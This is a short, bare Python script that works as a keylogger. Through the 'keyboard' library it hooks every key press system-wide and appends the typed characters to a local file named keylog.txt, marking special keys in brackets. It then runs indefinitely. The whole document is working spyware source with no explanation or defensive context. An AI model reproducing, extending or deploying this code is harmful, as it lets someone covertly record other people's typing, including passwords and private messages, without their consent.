import keyboard

def write_to_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "space":
                f.write(" ")
            elif k.find("key") == -1:
                f.write(k)

def on_key_press(event):
    key = event.name
    if len(key) > 1:
        if key == "space":
            key = " " 
        elif key == "enter":
            key = "\n"
        else:
            key = f"[{key}]"
    write_to_file(key)

keyboard.on_press(on_key_press)
keyboard.wait()

